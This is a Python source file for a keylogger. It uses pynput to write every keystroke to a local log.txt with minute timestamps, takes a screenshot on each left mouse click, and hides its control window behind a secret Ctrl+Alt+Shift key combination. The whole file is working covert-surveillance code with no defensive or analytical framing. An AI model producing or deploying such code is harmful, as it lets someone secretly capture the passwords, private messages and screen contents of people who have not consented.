import os
import re
import time
import tkinter as tk
# from cmath import log
from datetime import datetime as date
from threading import Thread

import pynput
from PIL import ImageGrab
from pynput.keyboard import Key
from pynput.mouse import Button as MouseButton

from ui import Application


class Keylogger():
    def __init__(self, logging):
        self.logging = logging
        self.initial()

    def initial(self):
        self.current_time = time.time()
        self.current_combination = set()
        self.COMBINATION = {"<80>", Key.alt_l, Key.shift_l, Key.ctrl_l}
        with open('log.txt', "a") as f:
            f.write('\n' + str(date.now()) + '-->')

    def start_logging(self):
        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            with pynput.mouse.Listener(on_click=self.on_click) as listener:
                listener.join()

    def on_press(self, key):
        self.write_file(key)

    def on_release(self, key):
        try:
            self.current_combination.remove(key)
        except KeyError:
            pass

    def write_file(self, key):
        with open('log.txt', "a") as f:
            self.check_combination(key)
            if self.logging:
                k = self.get_key_ready_for_print(key)
                if self.current_time + 59.9 <= time.time():
                    self.log_time(f)
                f.write(k)

    def get_key_ready_for_print(self, key):

        vk = getattr(key, 'vk', None)
        k = str(key)

        if k == '"\'"':
            k = k.replace('"', "")
        elif k == "'\"'":
            k = k.replace("'", "")
        elif '\\' in k:
            if k[1] == '\\' and k[2] == '\\':
                k = '\\'
            elif vk is not None:
                k = '^' + chr(key.vk)
        elif re.match(r'<\d+>', k) and vk is not None:
            k = chr(key.vk)
        elif vk is not None:
            k = k.replace("'", "")
            k = k.replace('"', "")
        elif vk is None:
            k = k.upper()
            k = k.replace('KEY.', '[')
            k = k + ']'
            if k == '[SPACE]':
                k = ' '
        else:
            pass
        return k

    def check_combination(self, key):
        if (str(key) == "<80>"):
            key = str(key)

        if key in self.COMBINATION:
            self.current_combination.add(key)
            if all(k in self.current_combination for k in self.COMBINATION):
                self.current_combination = set()
                application = Thread(name='Application', target=self.open_ui)
                application.start()

    def open_ui(self):
        root = tk.Tk()
        app = Application(self.logging, master=root)
        app.mainloop()

    def log_time(self, f):
        f.write('\n' + str(date.now()) + '-->')
        self.current_time = time.time()

    def take_screenshot(self):
        image_size = (1536, 864)
        snapshot = ImageGrab.grab()
        snapshot = snapshot.resize(image_size)
        screenshot_stamp = str(date.now()).replace(" ", "=")
        screenshot_stamp = screenshot_stamp.replace(":", "_")
        if not os.path.isdir('Images'):
            os.mkdir('Images')
        save_path = f"Images\\{screenshot_stamp}.jpg"
        snapshot.save(save_path)

    def on_click(self, x, y, button, pressed):
        if button == MouseButton.left and pressed and self.logging:
            self.take_screenshot()
